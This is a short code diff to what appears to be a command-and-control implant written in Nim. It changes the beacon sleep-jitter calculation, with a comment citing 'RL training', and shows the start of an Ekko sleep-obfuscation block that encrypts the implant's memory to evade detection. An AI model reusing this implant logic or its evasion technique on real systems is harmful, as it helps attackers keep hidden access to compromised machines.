@@ -176,7 +176,11 @@ proc runNp() : void =
                     listener.postCommandResults(cmdGuid, output)
 
         # Sleep the main thread for the configured sleep time and a random jitter %, including an exponential backoff multiplier
-        timeToSleep = sleepMultiplier * toInt(listener.sleepTime.float - (listener.sleepTime.float * rand(-listener.sleepJitter..listener.sleepJitter)))
+        #timeToSleep = sleepMultiplier * toInt(listener.sleepTime.float - (listener.sleepTime.float * rand(-listener.sleepJitter..listener.sleepJitter)))
+
+        # make it only positive, for the sake of RL training
+        timeToSleep = sleepMultiplier * toInt(listener.sleepTime.float - (listener.sleepTime.float * rand(-listener.sleepJitter..0.0)))
+
 
         when defined sleepmask:
             # Ekko Sleep obfuscation, encrypts the PE memory, set's permissions to RW and sleeps for the specified time
